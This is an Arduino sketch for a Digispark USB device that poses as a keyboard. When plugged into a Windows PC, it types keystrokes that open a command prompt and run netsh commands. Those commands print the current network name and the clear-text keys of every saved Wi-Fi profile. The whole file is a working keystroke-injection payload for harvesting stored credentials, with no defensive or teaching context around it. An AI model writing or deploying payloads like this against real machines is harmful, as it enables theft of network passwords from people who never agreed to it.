#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.delay(1000);
  
  // opens cmd
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("cmd\n");
  DigiKeyboard.delay(300);
  
  // actually shows password
  DigiKeyboard.print("netsh wlan show interfaces | findstr /L /c:\"    SSID                   :\"\n");
  DigiKeyboard.delay(200);
  DigiKeyboard.print("netsh wlan show profile name=* key=clear | findstr /L /c:\"    Key Content            :\"\n");
  DigiKeyboard.delay(200);
  DigiKeyboard.print("pause & exit\n");

}

void loop() {

 
}
